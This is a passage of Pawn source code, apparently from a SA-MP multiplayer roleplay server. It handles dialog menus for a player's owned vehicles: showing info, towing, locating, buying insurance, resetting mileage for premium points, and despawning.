			    	new car = personalcar[0][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[0][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[0][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[0][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[0][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[0][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[0][playerid];
			    if(personalcar[0][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[0][playerid]] = 0;
					DestroyVehicle(personalcar[0][playerid]);
					OwnedVeh(personalcar[0][playerid]) = 0;
					Gas[personalcar[0][playerid]] = 100;
					personalcar[0][playerid] = 0;
					DespawnCar[playerid][0] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN7)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey7],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[6][playerid],car2 = PlayerInfo[playerid][pCarkey7];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[6][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[6][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[6][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[6][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[6][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[6][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[6][playerid];
			    if(personalcar[6][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[6][playerid]] = 0;
					DestroyVehicle(personalcar[6][playerid]);
					OwnedVeh(personalcar[6][playerid]) = 0;
					Gas[personalcar[6][playerid]] = 100;
					personalcar[6][playerid] = 0;
					DespawnCar[playerid][6] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}if(dialogid == DIALOG_VEHSPAWN8)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey8],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[7][playerid],car2 = PlayerInfo[playerid][pCarkey8];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[7][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[7][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[7][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[7][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[7][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[7][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[7][playerid];
			    if(personalcar[7][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[7][playerid]] = 0;
					DestroyVehicle(personalcar[7][playerid]);
					OwnedVeh(personalcar[7][playerid]) = 0;
					Gas[personalcar[7][playerid]] = 100;
					personalcar[7][playerid] = 0;
					DespawnCar[playerid][7] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN9)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey9],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[8][playerid],car2 = PlayerInfo[playerid][pCarkey9];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[8][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[0][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[8][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[8][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[8][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[8][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[8][playerid];
			    if(personalcar[8][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[8][playerid]] = 0;
					DestroyVehicle(personalcar[8][playerid]);
					OwnedVeh(personalcar[8][playerid]) = 0;
					Gas[personalcar[8][playerid]] = 100;
					personalcar[8][playerid] = 0;
					DespawnCar[playerid][8] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN10)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey10],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[9][playerid],car2 = PlayerInfo[playerid][pCarkey10];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[9][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[9][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[9][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[9][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[9][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[9][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[9][playerid];
			    if(personalcar[9][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[9][playerid]] = 0;
					DestroyVehicle(personalcar[9][playerid]);
					OwnedVeh(personalcar[9][playerid]) = 0;
					Gas[personalcar[9][playerid]] = 100;
					personalcar[9][playerid] = 0;
					DespawnCar[playerid][9] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN11)
	{
	    if(response)
	    {
			new pcarid = 10;
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey11],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[pcarid][playerid],car2 = PlayerInfo[playerid][pCarkey11];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[pcarid][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[pcarid][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[pcarid][playerid];
			    if(personalcar[pcarid][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[pcarid][playerid]] = 0;
					DestroyVehicle(personalcar[pcarid][playerid]);
					OwnedVeh(personalcar[pcarid][playerid]) = 0;
					Gas[personalcar[pcarid][playerid]] = 100;
					personalcar[pcarid][playerid] = 0;
					DespawnCar[playerid][pcarid] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN12)
	{
	    if(response)
	    {
			new pcarid = 11;
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey12],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[pcarid][playerid],car2 = PlayerInfo[playerid][pCarkey12];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[pcarid][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "No");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[pcarid][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[pcarid][playerid];
			    if(personalcar[pcarid][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[pcarid][playerid]] = 0;
					DestroyVehicle(personalcar[pcarid][playerid]);
					OwnedVeh(personalcar[pcarid][playerid]) = 0;
					Gas[personalcar[pcarid][playerid]] = 100;
					personalcar[pcarid][playerid] = 0;
					DespawnCar[playerid][pcarid] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN13)
	{
	    if(response)
	    {
			new pcarid = 12;
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey13],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[pcarid][playerid],car2 = PlayerInfo[playerid][pCarkey13];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
